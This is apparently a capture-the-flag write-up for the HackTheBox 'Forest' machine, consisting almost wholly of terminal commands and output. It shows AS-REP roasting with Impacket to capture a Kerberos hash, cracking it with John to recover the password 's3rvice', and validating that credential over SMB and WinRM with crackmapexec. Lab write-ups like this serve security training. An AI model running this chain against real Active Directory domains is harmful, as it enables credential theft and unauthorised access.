

```bash
GetNPUsers.py htb.local/ -no-pass -usersfile users.txt
Impacket for Exegol - v0.10.1.dev1+20231106.134307.9aa9373 - Copyright 2022 Fortra - forked by ThePorgs

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:a3b605683623e28a805d9771f7989397$8c0e9b11eb16ad010fba33c641d13665ccff26498a71f8c7e964bab9bb726dbdd6cb71c8e91a27f23ba09b1a7b20e858cb9875cc620862ee562a505fd5ba39619b01d2eded2e57d09134664e8f7da756a3fa14a2f2096ace23097ec6a9e2712f3c4a176893587061e3344080ea206a084cfef24fd7f903b6f067c5db77123599b1ddab6d75487fe61ec971d73c5ecbd03f53e1ae0813a82f63f28fa0bcddeb569db4f55d36822056088513ad7e6dcafe4d087b6135e328a06d84809de98a347457911f09786344afaffd685d45d3836b7c0e4eaedd5957ffd1d4bfbae87e000daed89f2afe83
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```



```bash
john --wordlist=`fzf-wordlists` hash

Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
Cost 1 (etype) is 23 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)     
1g 0:00:00:01 DONE (2024-04-03 23:01) 0g/s 2817Kp/s 2817Kc/s 2817KC/s s5213336..s3r1bu
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

```bash
crackmapexec smb 10.129.252.217 -u 'svc-alfresco' -p 's3rvice'
SMB         10.129.252.217  445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.252.217  445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
```

```bash
crackmapexec smb 10.129.252.217 -u 'svc-alfresco' -p 's3rvice' --shares
SMB         10.129.252.217  445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.252.217  445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
SMB         10.129.252.217  445    FOREST           [*] Enumerated shares
SMB         10.129.252.217  445    FOREST           Share           Permissions     Remark
SMB         10.129.252.217  445    FOREST           -----           -----------     ------
SMB         10.129.252.217  445    FOREST           ADMIN$                          Remote Admin
SMB         10.129.252.217  445    FOREST           C$                              Default share
SMB         10.129.252.217  445    FOREST           IPC$                            Remote IPC
SMB         10.129.252.217  445    FOREST           NETLOGON        READ            Logon server share 
SMB         10.129.252.217  445    FOREST           SYSVOL          READ            Logon server share
```


```bash
crackmapexec winrm 10.129.252.217 -u 'svc-alfresco' -p 's3rvice'         
SMB         10.129.252.217  5985   FOREST           [*] Windows 10.0 Build 14393 (name:FOREST) (domain:htb.local)
HTTP        10.129.252.217  5985   FOREST           [*] http://10.129.252.217:5985/wsman
HTTP        10.129.252.217  5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (admin)
```